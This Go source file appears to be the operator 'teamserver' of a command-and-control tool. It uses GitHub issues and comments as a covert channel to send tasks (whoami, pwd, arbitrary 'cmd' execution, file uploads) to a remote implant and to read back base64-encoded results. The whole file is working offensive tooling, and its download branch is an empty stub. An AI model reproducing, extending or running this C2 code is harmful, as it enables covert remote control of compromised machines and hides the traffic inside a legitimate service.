package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"
)

// Issue 用于解析 GitHub API 返回的 issue 列表中的单个 issue 数据
type Issue struct {
	Number int `json:"number"` // Issue 编号
}

// 获取当前仓库的最晚 issue 编号，倒序
func GetOldestIssueNumber(token, owner, repo string) (int, error) {
	// 将 direction=desc 改为 direction=asc，以获取最早的 issue
	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/issues?state=all&sort=created&direction=desc", owner, repo)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return 0, fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Add("Authorization", "Bearer "+token)
	req.Header.Add("Accept", "application/vnd.github.v3+json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return 0, fmt.Errorf("failed to get issues: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return 0, fmt.Errorf("failed to read response body: %v", err)
	}

	// 解析返回的 issue 列表
	var issues []Issue
	if err := json.Unmarshal(body, &issues); err != nil {
		return 0, fmt.Errorf("failed to parse JSON: %v", err)
	}

	// 检查是否有返回的 issue
	if len(issues) == 0 {
		//return 0, fmt.Errorf("no issues found")
		return 1, nil
	}

	// 返回最早创建的 issue 的编号
	return issues[0].Number + 1, nil
}

func Error(msg string, err error) string {
	return fmt.Sprintf("%s (%v)", msg, err)
}

// base64 encode function
func base64Encode(plain string) string {
	return base64.StdEncoding.EncodeToString([]byte(plain))
}

// base64 decode function
func base64Decode(encoded string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

// Create GitHub issue
func PostIssue(token, owner, repo, task string) error {
	client := &http.Client{}

	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/issues", owner, repo)
	payload := strings.NewReader(fmt.Sprintf(`{"title":"%s", "body":"What's up"}`, task))

	req, err := http.NewRequest("POST", url, payload)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Add("Authorization", "Bearer "+token)
	req.Header.Add("Content-Type", "application/json")
	req.Header.Add("Accept", "application/vnd.github+json")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed in HttpSendRequest: %v", err)
	}
	defer resp.Body.Close()

	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read response: %v", err)
	}

	fmt.Println("[+] Issue Created!")
	return nil
}

// Get GitHub comments
func GetComment(token, owner, repo, issueNbr string) (string, error) {
	client := &http.Client{}

	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/issues/%s/comments", owner, repo, issueNbr)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Add("Authorization", "Bearer "+token)
	req.Header.Add("Accept", "application/vnd.github+json")

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response: %v", err)
	}

	//fmt.Println(string(body))
	return string(body), nil
}

// Find the comment body in the response
func findCommentBody(comment string) string {
	start := strings.Index(comment, `"body":"`)
	if start == -1 {
		return ""
	}
	start += len(`"body":"`)

	end := strings.Index(comment[start:], `",`)
	if end == -1 {
		return ""
	}

	return comment[start : start+end]
}

func fileUploadPostIssue(token, owner, repo, task string) error {
	client := &http.Client{}
	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/issues", owner, repo)

	// 获取上传文件的路径和内容，写入到issue里面。
	args := strings.Fields(task)
	local_file_path := args[1]
	data, err := ioutil.ReadFile(local_file_path)
	if err != nil {
		return fmt.Errorf("failed in reading local_file: %v", local_file_path)
	}
	encoded := base64.StdEncoding.EncodeToString(data)
	//fmt.Println(encoded)

	payload := strings.NewReader(fmt.Sprintf(`{"title":"%s", "body":"%s"}`, task, encoded))

	req, err := http.NewRequest("POST", url, payload)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	req.Header.Add("Authorization", "Bearer "+token)
	req.Header.Add("Content-Type", "application/json")
	req.Header.Add("Accept", "application/vnd.github+json")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed in HttpSendRequest: %v", err)
	}
	fmt.Println(resp)
	defer resp.Body.Close()

	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read response: %v", err)
	}

	fmt.Println("[+] Issue Created!")
	return nil
}

func printHelp() {
	fmt.Println("help : show this help menu")
	fmt.Println("pwd : print working directory")
	fmt.Println("whoami : get username")
	fmt.Println("cmd <command> : execute command")
	fmt.Println("upload <local_file_path> <remote_file_path> : upload local file to the implant")
	fmt.Println("download <remote_file_path> <local_file_path> : download file of implant to local path")
	fmt.Println("exit : kill the connection with the implant")
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: teamserver <AccessToken> <Username> <Repository>")
		return
	}

	token := os.Args[1]
	owner := os.Args[2]
	repo := os.Args[3]
	//task := ""
	issueNbr, err := GetOldestIssueNumber(token, owner, repo)
	if err != nil {
		fmt.Println(fmt.Errorf("Failed to get issue number: %v", err))
		return
	}
	fmt.Println(fmt.Sprintf("the final issue number is %d", issueNbr))

	for {
		fmt.Print("Implant # ")
		//fmt.Scanln(&task)
		reader := bufio.NewReader(os.Stdin)
		task, err := reader.ReadString('\n')
		task = strings.TrimSpace(task)
		fmt.Println(task)
		if err != nil {
			fmt.Println("读取命令发生错误：", err)
			continue
		}
		if task == "pwd" || task == "whoami" || task == "exit" || strings.HasPrefix(task, "cmd") {
			fmt.Printf("task: %s\n", task)
			if err := PostIssue(token, owner, repo, task); err != nil {
				fmt.Println(Error("Failed to post issue", err))
				continue
			}

			time.Sleep(8 * time.Second)

			issueNbrStr := fmt.Sprintf("%d", issueNbr)
			comment, err := GetComment(token, owner, repo, issueNbrStr)
			if err != nil {
				fmt.Println(Error("Failed to get comment", err))
				continue
			}
			commentResp := findCommentBody(comment)
			issueNbr++
			if commentResp != "" {
				decoded, err := base64Decode(commentResp)
				if err != nil {
					fmt.Println("Decode Failure")
					continue
				}
				fmt.Printf("Response Decoded: \n%s\n", decoded)
			} else {
				fmt.Println("No Response found")
			}
		} else if strings.HasPrefix(task, "upload") {
			fmt.Printf("task: %s\n", task)
			//if err := PostIssue(token, owner, repo, task); err != nil {
			//	fmt.Println(Error("Failed to post issue", err))
			//	continue
			//}
			if err := fileUploadPostIssue(token, owner, repo, task); err != nil {
				fmt.Println(Error("Failed to post issue", err))
				continue
			}
			start_time := time.Now()
			success_flag := false
			fmt.Print("waiting for the file upload...")
			// 写个循环检测文件是否已经上传完成
			for {
				issueNbrStr := fmt.Sprintf("%d", issueNbr)
				comment, err := GetComment(token, owner, repo, issueNbrStr)
				if err != nil {
					fmt.Println(Error("Failed to get comment", err))
					continue
				}
				commentResp := findCommentBody(comment)
				if commentResp != "" {
					decoded, err := base64Decode(commentResp)
					if err != nil {
						fmt.Println("Decode Failure")
					}
					if decoded == "upload success" {
						success_flag = true
						break
					}
				}
				time.Sleep(1 * time.Second)
				fmt.Print(".")
			}
			if success_flag == true {
				usertime := time.Since(start_time)
				fmt.Println("\nfile upload success, time-consuming: ", usertime)
			} else {
				fmt.Println("\nfile upload fail, please try again")
			}
			issueNbr++
		} else if strings.HasPrefix("download", task) {
			fmt.Printf("task: %s\n", task)

		} else {
			printHelp()
		}
	}
}
